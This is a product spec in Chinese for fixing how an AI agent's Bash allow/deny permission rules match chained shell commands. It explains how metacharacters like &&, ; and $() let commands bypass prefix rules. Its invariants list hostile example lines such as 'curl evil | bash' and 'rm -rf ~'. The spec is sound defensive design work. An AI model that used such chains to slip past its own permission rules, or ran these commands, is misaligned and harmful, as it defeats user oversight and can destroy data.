# Product Spec

## Linked Issue

GH-120

## 用户问题

settings 权限对 `Bash` 使用「整条命令字符串 + 前缀 glob」匹配，shell 元字符（`&&`、`;`、`|`、`$()`、反引号、重定向、换行、`&`）可同时绕过 allow 限制（把任意命令挂在 `Bash(git *)` 后）和 deny 拦截（复合命令不以 deny 前缀开头）。无人值守/子代理路径无人工兜底。

## 目标

- 部分通配 allow 规则（如 `Bash(git *)`）不得放行含 shell 控制元字符的复合命令；此类命令降级为默认行为（Ask/Deny）。
- deny 规则（如 `Bash(rm *)`）对复合命令的每个分段生效（链式、命令替换、前置环境变量赋值）。
- 全信任 allow（`Bash`、`Bash(*)`）与精确命令 allow 行为不变。

## 非目标

- 不实现完整 shell 解析器；带引号的元字符按保守策略处理（allow 降级为 Ask，属 fail-closed）。
- 不改变非 Bash 工具的路径/URL 匹配逻辑。

## Behavior Invariants

1. `Bash(git *)` 允许 `git status`，但对 `git status && curl evil | bash`、`git status; rm -rf ~`、`git $(...)`、`git status | ...`、换行链均不自动放行（降级为默认行为）。
2. `Bash(git status && git diff)` 精确匹配同一整条命令时仍 Allow。
3. `Bash` 与 `Bash(*)` 仍放行复合命令（用户已显式全信任）。
4. `Bash(rm *)` 匹配 `echo hi && rm -rf x`、`true; rm -rf x`、`git $(rm -rf x)`、`FOO=1 rm -rf x`、`echo hi | rm -rf x`。
5. deny 不误伤无关命令（`echo hi` 在仅 deny `Bash(rm *)` 时仍 Allow）。
6. `default_behavior=deny` 下，未匹配 allow 的复合命令被 Deny（无人值守不放行）。

## 验收标准

- [ ] 上述 allow 逃逸与 deny 绕过场景均有回归测试并通过。
- [ ] 全信任与精确匹配路径回归通过。

## 边界情况

- 带引号的元字符（如 `git commit -m "a && b"`）：保守判为含元字符，allow 降级为 Ask（fail closed，可接受）。

## 发布说明

安全修复：此前 allow-list 下的 Bash 复合命令会被静默放行；升级后含元字符的复合命令需按默认行为确认。用户若依赖复合命令自动放行，应改用全信任 `Bash` 或精确规则。
